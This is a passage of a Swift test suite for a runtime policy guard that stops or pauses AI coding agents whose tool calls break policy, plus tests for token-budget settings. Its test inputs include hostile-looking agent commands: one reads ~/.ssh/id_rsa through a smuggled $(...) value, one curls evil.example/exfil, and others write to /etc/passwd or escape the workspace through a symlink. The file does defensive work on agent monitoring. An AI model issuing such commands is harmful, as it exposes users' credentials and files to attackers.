        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "git status --short $(cat ~/.ssh/id_rsa)"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("outside the allowed command patterns") == true)
    }

    @Test("Mutating file outside allowed paths stops the provider")
    func outsidePathMutationStopsProvider() {
        let manifest = runtimePolicyManifest(allowedTools: ["Write"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Write", id: "t1", input: ["file_path": "/etc/passwd"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("outside the workspace paths") == true)
    }

    @Test("Ask-first task output artifact write is allowed without approval")
    func askFirstTaskOutputArtifactWriteIsAllowedWithoutApproval() throws {
        let taskID = try #require(UUID(uuidString: "B405BA1D-26C0-401E-AD63-F57C0F217C3C"))
        let workspacePath = "/tmp/astra-policy-guard"
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Write"],
            workspacePath: workspacePath,
            taskID: taskID
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "Write",
                id: "t1",
                input: [
                    "file_path": "\(workspacePath)/.astra/tasks/B405BA1D/index.html",
                    "content": "<html></html>"
                ]
            ),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Ask-first task output artifact write allows private symlink path")
    func askFirstTaskOutputArtifactWriteAllowsPrivateSymlinkPath() throws {
        let taskID = try #require(UUID(uuidString: "B405BA1D-26C0-401E-AD63-F57C0F217C3C"))
        let workspacePath = NSTemporaryDirectory() + "astra-policy-guard-\(UUID().uuidString)"
        defer { try? FileManager.default.removeItem(atPath: workspacePath) }
        try FileManager.default.createDirectory(
            atPath: "\(workspacePath)/.astra/tasks/B405BA1D",
            withIntermediateDirectories: true
        )
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Write"],
            workspacePath: workspacePath,
            taskID: taskID
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )
        let canonicalWorkspacePath = workspacePath.hasPrefix("/private/")
            ? workspacePath
            : "/private" + workspacePath

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "Write",
                id: "t1",
                input: [
                    "file_path": "\(canonicalWorkspacePath)/.astra/tasks/B405BA1D/index.html",
                    "content": "<html></html>"
                ]
            ),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Ask-first workspace artifact write outside task output still asks")
    func askFirstWorkspaceArtifactWriteOutsideTaskOutputStillAsks() throws {
        let taskID = try #require(UUID(uuidString: "B405BA1D-26C0-401E-AD63-F57C0F217C3C"))
        let workspacePath = "/tmp/astra-policy-guard"
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Write"],
            workspacePath: workspacePath,
            taskID: taskID
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "Write",
                id: "t1",
                input: [
                    "file_path": "\(workspacePath)/index.html",
                    "content": "<html></html>"
                ]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == true)
        #expect(monitor.policyViolation == false)
        #expect(monitor.policyViolationMessage == nil)
        #expect(monitor.policyApprovalMessage?.contains("Permission requested for tool: Write") == true)
        #expect(monitor.policyApprovalMessage?.contains("ask-first") == true)
    }

    @Test("Read outside allowed paths stops the provider when path is observable")
    func outsidePathReadStopsProvider() {
        let manifest = runtimePolicyManifest(allowedTools: ["Read"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Read", id: "t1", input: ["file_path": "/private/tmp/outside.txt"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
    }

    @Test("Mutating tool without observable path stops the provider")
    func mutationWithoutPathStopsProvider() {
        let manifest = runtimePolicyManifest(allowedTools: ["Write"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Write", id: "t1", input: [:]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("could not validate the file path") == true)
    }

    @Test("Network destination outside allow-list stops the provider")
    func networkOutsideAllowListStopsProvider() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["WebFetch"],
            allowedURLPatterns: ["https://allowed.example/*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "WebFetch", id: "t1", input: ["url": "https://evil.example/data"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("outside the URL allow-list") == true)
    }

    @Test("Every URL in shell network commands must satisfy the allow-list")
    func shellCommandWithSecondURLOutsideAllowListStopsProvider() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            allowedURLPatterns: ["https://allowed.example/*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "Bash",
                id: "t1",
                input: [
                    "command": "curl https://allowed.example/status && curl https://evil.example/exfil"
                ]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("outside the URL allow-list") == true)
    }

    @Test("Specific URL deny patterns stop the provider")
    func specificURLDenyPatternStopsProvider() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            deniedURLPatterns: ["https://evil.example/*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "Bash",
                id: "t1",
                input: ["command": "curl https://evil.example/data"]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("denied URL pattern") == true)
    }

    @Test("Symlinked paths escaping workspace stop the provider")
    func symlinkPathEscapeStopsProvider() throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("astra-policy-root-\(UUID().uuidString)", isDirectory: true)
        let outside = FileManager.default.temporaryDirectory
            .appendingPathComponent("astra-policy-outside-\(UUID().uuidString)", isDirectory: true)
        let link = root.appendingPathComponent("linked-outside", isDirectory: true)
        let secret = link.appendingPathComponent("secret.txt")
        defer {
            try? FileManager.default.removeItem(at: root)
            try? FileManager.default.removeItem(at: outside)
        }
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: outside, withIntermediateDirectories: true)
        try Data("secret".utf8).write(to: outside.appendingPathComponent("secret.txt"))
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: outside)

        let manifest = runtimePolicyManifest(allowedTools: ["Read"], workspacePath: root.path)
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Read", id: "t1", input: ["file_path": secret.path]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
    }

    @Test("Copilot view tool follows read path policy")
    func copilotViewToolFollowsReadPathPolicy() {
        let manifest = runtimePolicyManifest(allowedTools: ["Read"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "view",
                id: "t1",
                input: ["summary": #"{"path":"/tmp/astra-policy-guard/.astra/tasks/7296659E/outputs"}"#]
            ),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyViolation == false)
        #expect(monitor.policyApprovalRequired == false)
    }

    @Test("Copilot create tool pauses as scoped file write approval")
    func copilotCreateToolPausesAsScopedFileWriteApproval() throws {
        let manifest = runtimePolicyManifest(
            allowedTools: ["read"],
            askFirstTools: ["write"],
            providerID: .copilotCLI
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )
        let path = "/tmp/astra-policy-guard/.astra/tasks/7296659E/index.html"

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "create",
                id: "t1",
                input: ["path": path]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == true)
        #expect(monitor.policyViolation == false)
        let payload = try #require(monitor.policyApprovalMessage)
        let decoded = try #require(PermissionApprovalEventPayload.decoded(from: payload))
        #expect(decoded.request == .fileWrite(path: path, toolName: "create"))
        #expect(decoded.grants.contains(.filePath(path: path, access: "write")))
        #expect(decoded.grants.contains(.providerTool(name: "Write")))
        #expect(decoded.displayMessage.contains("Runtime grant: write"))
    }

    @Test("Copilot read allow covers provider read-class grep and glob tools")
    func copilotReadAllowCoversProviderReadClassGrepAndGlobTools() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["read"],
            providerID: .copilotCLI
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let grepShouldKill = monitor.processEvent(
            .toolUse(
                name: "grep",
                id: "t1",
                input: [
                    "pattern": "open_prs",
                    "paths": "/tmp/astra-policy-guard"
                ]
            ),
            process: nil
        )
        let globShouldKill = monitor.processEvent(
            .toolUse(
                name: "glob",
                id: "t2",
                input: ["pattern": "*.json"]
            ),
            process: nil
        )

        #expect(grepShouldKill == false)
        #expect(globShouldKill == false)
        #expect(monitor.policyViolation == false)
        #expect(monitor.policyApprovalRequired == false)
    }
}

private func runtimePolicyManifest(
    allowedTools: [String],
    askFirstTools: [String] = [],
    deniedTools: [String] = [],
    allowedShellPatterns: [String] = [],
    askFirstShellPatterns: [String] = [],
    deniedShellPatterns: [String] = [],
    allowedURLPatterns: [String] = [],
    deniedURLPatterns: [String] = [],
    workspacePath: String = "/tmp/astra-policy-guard",
    permissionMode: String = PermissionPolicy.restricted.rawValue,
    providerID: AgentRuntimeID = .claudeCode,
    policyLevel: AgentPolicyLevel = .review,
    usesBroadProviderPermissions: Bool = false,
    approvalGrants: [PermissionGrant] = [],
    runtimeSupportTools: [ProviderRuntimeSupportToolDescriptor] = [],
    taskID: UUID = UUID()
) -> RunPermissionManifest {
    let render = ProviderPolicyRender(
        providerID: providerID,
        adapterVersion: 1,
        policyLevel: policyLevel,
        configOwnership: .generated,
        permissionMode: permissionMode,
        allowedTools: allowedTools,
        runtimeSupportTools: runtimeSupportTools,
        askFirstTools: askFirstTools,
        deniedTools: deniedTools,
        allowedShellPatterns: allowedShellPatterns,
        askFirstShellPatterns: askFirstShellPatterns,
        deniedShellPatterns: deniedShellPatterns,
        allowedURLPatterns: allowedURLPatterns,
        deniedURLPatterns: deniedURLPatterns,
        cliArgumentsSummary: [],
        settingsSummary: "test",
        generatedConfigPreview: "",
        enforcementTiers: [.providerNative, .astraBrokered],
        diagnostics: [],
        usesBroadProviderPermissions: usesBroadProviderPermissions
    )
    return RunPermissionManifest(
        taskID: taskID,
        runID: UUID(),
        phase: "test",
        providerID: providerID,
        providerVersion: nil,
        model: "test",
        policyLevel: policyLevel,
        policyScope: .taskOverride,
        providerRender: render,
        workspacePath: workspacePath,
        additionalPaths: [],
        environmentKeyNames: [],
        credentialLabels: [],
        approvalsGranted: [],
        approvalGrants: approvalGrants
    )
}

@Suite("Budget Enforcement Preferences")
struct BudgetEnforcementPreferenceTests {
    @Test("Configured enforcement defaults to warning and reads overrides")
    func configuredDefaultReadsStoredMode() {
        let suiteName = "astra-budget-enforcement-\(UUID().uuidString)"
        let defaults = UserDefaults(suiteName: suiteName)!
        defer { defaults.removePersistentDomain(forName: suiteName) }

        #expect(BudgetEnforcementMode.configuredDefault(in: defaults) == .warning)

        defaults.set(BudgetEnforcementMode.warning.rawValue, forKey: AppStorageKeys.budgetEnforcementMode)
        #expect(BudgetEnforcementMode.configuredDefault(in: defaults) == .warning)

        defaults.set(BudgetEnforcementMode.hardStop.rawValue, forKey: AppStorageKeys.budgetEnforcementMode)
        #expect(BudgetEnforcementMode.configuredDefault(in: defaults) == .hardStop)

        defaults.set("unexpected", forKey: AppStorageKeys.budgetEnforcementMode)
        #expect(BudgetEnforcementMode.configuredDefault(in: defaults) == .warning)
    }
}

@Suite("Runtime Budget Profiles")
struct RuntimeBudgetProfileTests {
    @Test("Every provider has a budget profile")
    func everyProviderHasBudgetProfile() {
        for runtime in AgentRuntimeAdapterRegistry.runtimeIDs {
            let profile = AgentRuntimeBudgetProfile.profile(for: runtime)
            #expect(profile.runtime == runtime)
            #expect(profile.launchOverheadTokens >= 0)
        }
    }

    @Test("Launch estimates are provider specific")
    func launchEstimatesAreProviderSpecific() {
        let prompt = String(repeating: "x", count: 400)
        let promptEstimate = AgentProcessMonitor.estimatedTokenCount(for: prompt)

        let claude = AgentRuntimeBudgetProfile.profile(for: .claudeCode)
        let copilot = AgentRuntimeBudgetProfile.profile(for: .copilotCLI)

        #expect(claude.estimatedLaunchInputTokens(prompt: prompt) == promptEstimate + claude.launchOverheadTokens)
        #expect(copilot.estimatedLaunchInputTokens(prompt: prompt) == promptEstimate + copilot.launchOverheadTokens)
        #expect(claude.launchOverheadTokens > copilot.launchOverheadTokens)
    }

    @Test("Effective budget scales team budgets without audit side effects")
    func effectiveBudgetScalesTeamBudgets() {
        #expect(AgentRuntimeProcessRunner.effectiveTokenBudget(
            baseBudget: 0,
            usesAgentTeam: true,
            teamSize: 3
        ) == Int.max)
        #expect(AgentRuntimeProcessRunner.effectiveTokenBudget(
            baseBudget: 100_000,
            usesAgentTeam: false,
            teamSize: 3
        ) == 100_000)
        #expect(AgentRuntimeProcessRunner.effectiveTokenBudget(
            baseBudget: 100_000,
            usesAgentTeam: true,
            teamSize: 1
        ) == 200_000)
        #expect(AgentRuntimeProcessRunner.effectiveTokenBudget(
            baseBudget: 100_000,
            usesAgentTeam: true,
            teamSize: 3
        ) == 300_000)
    }
}
